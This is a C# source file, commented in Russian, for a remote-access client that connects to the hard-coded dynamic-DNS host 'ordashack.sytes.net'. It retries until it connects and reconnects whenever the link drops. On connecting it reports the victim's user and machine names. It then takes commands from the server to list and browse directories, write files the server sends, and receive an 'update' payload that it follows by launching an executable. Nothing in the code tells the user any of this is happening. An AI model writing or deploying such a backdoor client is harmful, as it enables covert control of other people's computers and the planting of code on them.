using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using System.Diagnostics;

namespace HClient
{
    class Program
    {
        static Socket mySocket; //инициализзируем сокет;
        static MemoryStream ms = new MemoryStream(new byte[256 * 100], 0, 256 * 100, true, true);
        
        static BinaryWriter writer = new BinaryWriter(ms);
        static BinaryReader reader = new BinaryReader(ms);//чтение из потока
        static string currentDir;//положение директории
        static Thread checkConnection;
        static bool connectionIsOn;

        static Dictionary<string, int> codeReq = new Dictionary<string, int>()//команда и код
        {
            {"dir", 1},          //список файлов
            {"cd", 2},           //смена директории
            {"introduce", 3},    //получение информации о клиенте
            {"upload", 4 },      //загрузка файла на компютер клиента
            {"check", 100},      //получение информации о версии библиотеки
        };

        static void Main(string[] args)
        {
            Console.Title = "Client";
            connectionIsOn = false;
            currentDir = Environment.CurrentDirectory;// сохраненная директория
            Connection();
           
            checkConnection = new Thread(() =>
            {
                while (true)//бесконечный цикл проверки состояния подключения
                {
                    if (mySocket.Poll(1, SelectMode.SelectRead) && mySocket.Available == 0)//если связь потеряна
                    {
                        Console.WriteLine("Связь с сервером потеряна");
                        Thread.Sleep(1000);
                        connectionIsOn = false;
                        Connection();//пробуем подключиться                        
                    }
                    Thread.Sleep(1000); // каждые 10 секунд
                }
            });
            checkConnection.Start();// запускаем поток проверки*/

        }

        private static void Connection()//функция подключения
        {
            Console.WriteLine("Подключение к серверу");
            mySocket = new Socket(SocketType.Stream, ProtocolType.Tcp); //инициализзируем сокет;
            while (!mySocket.Connected)//пока нет подключения
            {
                
                try
                {
                    mySocket.Connect(@"ordashack.sytes.net", 80);      //пробуем подключиться к серверу   
                    //mySocket.Connect("192.168.0.15", 8080);      //пробуем подключиться к серверу    
                    //mySocket.Connect(@"127.0.0.1", 8080);
                }
                catch
                {
                    Console.Write(".");
                }                
            }
            connectionIsOn = true;
            Console.Clear();
            Console.WriteLine("Подключен.");
            Thread.Sleep(1000);
            Console.Clear();
            introduse();//представляемся
            Task.Run(() => { while (connectionIsOn) recivePocket(); });//запускаем цикл
        }

        
        static void sendPocket()//неиспользуемая функция
        {
            ms.Position = 0;
            writer.Write("ok");
            mySocket.Send(ms.GetBuffer());
        }

        private static void recivePocket()//функция пакета с иформацией
        {
            ms.Position = 0;
            mySocket.Receive(ms.GetBuffer());
            string request = reader.ReadString();
            //--------------------------------------------
            if(request.Equals("update"))
            {
                Update();
                
            }
            else
            {
                Request(ref currentDir, request, ms, mySocket);
                
            }
            
        }

        private static void introduse()//при подключении передает информацию о себе
        {
            ms.Position = 0;
            writer.Write(Environment.UserName);
            writer.Write(Environment.MachineName);
            writer.Write(Environment.CurrentDirectory);
            mySocket.Send(ms.GetBuffer());
        }
        
        private static void Update()
        {
            string path = Environment.CurrentDirectory + "\\update.tmp";
            using (FileStream fs = new FileStream(path, FileMode.OpenOrCreate))
            {
                int leng = reader.ReadInt32();
                byte[] data = new byte[leng];
               

                data = reader.ReadBytes(leng);
                fs.Write(data, 0, data.Length);
                // считывает байт в память и переводит каретку на байт вперед
                ms.Position = 0;                
                writer.Write("Загрузка завершена.");
                Process.Start(Environment.CurrentDirectory + "\\HUpdater.exe");
                Environment.Exit(0);
            }
        }


        static public void Request(ref string currentDir, string req, MemoryStream ms, Socket socket)//передаем  ссылку на данные о клиенте, запрос, иссылку на стрим
        {
            BinaryWriter writer = new BinaryWriter(ms);
            BinaryReader reader = new BinaryReader(ms);//чтение из потока
            string[] reqOpt = strigSpliter(req);//обработка строки, массив содержит команду и ее опции
            int code;//сюда будет записан код команды
            codeReq.TryGetValue(reqOpt[0], out code);     //записываем код команды     
            const double VERSION = 0.4;

            switch (code)
            {
                case 1://получаем файлы в папке
                    ms.Position = 0;

                    List<string> dirList = new List<string>();//список файлов

                    DirectoryInfo dr = new DirectoryInfo(currentDir);//получаем файлы из рабочей директории
                    dirList.Add("   FILES");
                    foreach (FileInfo fi in dr.GetFiles())//получаем в список файлы
                    {
                        dirList.Add(fi.ToString());
                    }
                    dirList.Add("   DIRECTORIES");
                    foreach (DirectoryInfo fi in dr.GetDirectories())//получаем папки
                    {

                        dirList.Add(fi.ToString());
                    }
                    writer.Write(1);//код операции
                    writer.Write(dirList.Count);//записываем колличество данных
                    foreach (var fi in dirList)//записываем в врайтер список
                    {
                        writer.Write(fi);
                    }

                    break;
                case 2://переходим в директорию
                    ms.Position = 0;
                    if (Directory.Exists(reqOpt[1]))//проверяем существует ли дирректория
                    {
                        currentDir = reqOpt[1];//если да записываем ее в ссылочную переменную
                        writer.Write(2);//код операции
                        writer.Write(currentDir);//возвращаем директорию
                    }
                    else
                    {
                        writer.Write(13);//ошибка
                        writer.Write("Директория не существует.");
                    }

                    break;
                case 3://представляемся информацию если произошла ошибка
                    ms.Position = 0;
                    writer.Write(3);//код операции
                    writer.Write(Environment.UserName);
                    writer.Write(Environment.MachineName);
                    writer.Write(currentDir);
                    break;
                case 4://загрузка файла
                    ms.Position = 0;
                    writer.Write(4);//код операции
                    socket.Send(ms.GetBuffer());
                    ms.Position = 0;
                    socket.Receive(ms.GetBuffer());
                    int length = reader.ReadInt32();
                    string name = reader.ReadString();
                    int size = 2000000;
                    if (length < size)
                    {
                        size = length;
                    }
                    
                    //int seekF = 0;
                    ms.Position = 0;
                    writer.Write("OK. Information has recived.");//код операции
                    socket.Send(ms.GetBuffer());
                    //int procent = 0;
                    //int part = 100/(length / size);
                    reciveFile(ref socket, length, name);
                    ms.Position = 0;
                    writer.Write("Загрузка завершена.");
                    break;
                case 100: //возвращает информацию о версии                    
                    ms.Position = 0;
                    writer.Write(100);//код операции
                    writer.Write("Проверка. Версия " + VERSION);
                    break;
                default: //при неправильном запросе
                    ms.Position = 0;
                    writer.Write(13);
                    writer.Write("Команда не существует.");
                    break;
            }
            socket.Send(ms.GetBuffer());

        }

        private static void reciveFile(ref Socket socketF,int lenghFile, string nameFile)
        {
            using (MemoryStream msFile = new MemoryStream(new byte[lenghFile], 0, lenghFile, true, true))
            {
                BinaryReader readerFile = new BinaryReader(msFile);
                byte[] data = new byte[lenghFile];
                using (FileStream fs = new FileStream(Environment.CurrentDirectory + '\\' + nameFile, FileMode.Create))
                {
                    msFile.Position = 0;
                    socketF.Receive(msFile.GetBuffer());
                    data = readerFile.ReadBytes(lenghFile);
                    fs.Write(data, 0, data.Length);
                    // считывает байт в память и переводит каретку на байт вперед
                    
                }
            }

            
                
        }

        private static string[] strigSpliter(string req)
        {
            string[] retStr = new string[1];
            if (req.Contains('>'))
            {
                return req.Split(new char[] { '>' }, StringSplitOptions.RemoveEmptyEntries);
            }
            else
            {
                retStr[0] = req;
                return retStr;
            }
        }
    }
}





/*using (MemoryStream msFile = new MemoryStream(new byte[2000000], 0, 2000000, true, true))
                    {
                        byte[] data = new byte[length];
                        byte[] dataRecive = new byte[size];
                        BinaryReader readerFile = new BinaryReader(msFile);
                        bool end = false;
                        using (FileStream fs = new FileStream(Environment.CurrentDirectory + '\\' + name, FileMode.OpenOrCreate))
                        {
                            
                            while (!end)
                            {

                                socket.Receive(msFile.GetBuffer());
                               dataRecive = readerFile.ReadBytes(size);

                                try
                                {
                                    Array.Copy(dataRecive, 0, data, seekF, dataRecive.Length);
                                }
                                catch (Exception ex)
                                {
                                    Console.WriteLine(ex);
                                }


                                seekF += size;
                                ms.Position = 0;
                                procent += part;
                                writer.Write(procent);
                                socket.Send(ms.GetBuffer());
                                ms.Position = 0;
                                socket.Receive(ms.GetBuffer());

                                end = reader.ReadBoolean();
                                // считывает байт в память и переводит каретку на байт вперед
                            }
                            fs.Write(data, 0, length);

                        }

                        ms.Position = 0;
                        writer.Write("Загрузка завершена.");
                    }*/
